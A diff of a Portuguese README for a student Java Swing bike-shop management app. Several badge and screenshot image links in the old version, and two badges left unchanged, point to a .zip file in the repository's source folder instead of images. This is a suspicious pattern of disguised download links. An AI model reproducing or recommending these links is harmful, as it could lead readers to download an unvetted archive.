@@ -2,7 +2,7 @@
 
 > "Qualidade, Performance e estilo Peba de ser."
 
-![Java](https://raw.githubusercontent.com/emersontecn/PebasBikeShop_ProjetoPOO/main/src/br/com/bikeshop/app/PebasBikeShop_ProjetoPOO-1.9.zip)
+![Java](https://skillicons.dev/icons?i=java)](https://skillicons.dev)
 ![Eclipse](https://raw.githubusercontent.com/emersontecn/PebasBikeShop_ProjetoPOO/main/src/br/com/bikeshop/app/PebasBikeShop_ProjetoPOO-1.9.zip)
 ![Swing](https://raw.githubusercontent.com/emersontecn/PebasBikeShop_ProjetoPOO/main/src/br/com/bikeshop/app/PebasBikeShop_ProjetoPOO-1.9.zip)
 
@@ -18,11 +18,11 @@ O sistema consiste em uma aplicação Desktop em **Java Swing** para o gerenciam
 
 | Tela Inicial | Gestão de Estoque |
 |:---:|:---:|
-| <img src="src/imagens/print_home.png" width="400"> | <img src="https://raw.githubusercontent.com/emersontecn/PebasBikeShop_ProjetoPOO/main/src/br/com/bikeshop/app/PebasBikeShop_ProjetoPOO-1.9.zip" width="400"> |
+| <img src="src/imagens/print_home.png" width="400"> | <img src="src/imagens/print_estoque.png" width="400"> |
 
 | Nova Venda | Comprovante Fiscal |
 |:---:|:---:|
-| <img src="https://raw.githubusercontent.com/emersontecn/PebasBikeShop_ProjetoPOO/main/src/br/com/bikeshop/app/PebasBikeShop_ProjetoPOO-1.9.zip" width="400"> | <img src="https://raw.githubusercontent.com/emersontecn/PebasBikeShop_ProjetoPOO/main/src/br/com/bikeshop/app/PebasBikeShop_ProjetoPOO-1.9.zip" width="400"> |
+| <img src="src/imagens/print_venda.png" width="400"> | <img src="src/imagens/print_fatura.png" width="400"> |
 
 ---
 
